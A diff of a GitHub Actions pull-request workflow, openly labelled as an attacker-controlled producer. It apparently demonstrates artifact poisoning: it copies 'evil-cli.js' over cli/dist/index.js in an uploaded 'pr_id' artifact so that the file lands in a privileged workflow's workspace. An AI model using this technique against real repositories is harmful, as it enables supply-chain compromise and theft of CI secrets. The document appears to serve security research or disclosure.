@@ -1,5 +1,8 @@
 name: "Pull Request"
 
+# Attacker-controlled version of the producer workflow (runs from the PR head,
+# unprivileged, no secrets). It uploads an artifact named `pr_id` whose contents
+# land in the privileged workflow's workspace.
 on:
   pull_request:
     types:
@@ -9,7 +12,6 @@ on:
       - labeled
 
 env:
-  PR_ID_FILE: "_pr_id.txt"
   PR_ID: ${{ github.event.number }}
 
 jobs:
@@ -17,11 +19,17 @@ jobs:
     runs-on: ubuntu-latest
     timeout-minutes: 5
     steps:
-      - name: Save PR ID
-        run: echo "$PR_ID" > ${{ env.PR_ID_FILE }}
+      - uses: actions/checkout@v4
+
+      - name: Stage attacker-controlled artifact
+        run: |
+          mkdir -p staging/cli/dist
+          echo "$PR_ID" > staging/_pr_id.txt
+          cp evil-cli.js staging/cli/dist/index.js
+          find staging -type f -print
 
       - name: Upload PR ID
         uses: actions/upload-artifact@v4
         with:
           name: pr_id
-          path: ${{ env.PR_ID_FILE }}
+          path: staging
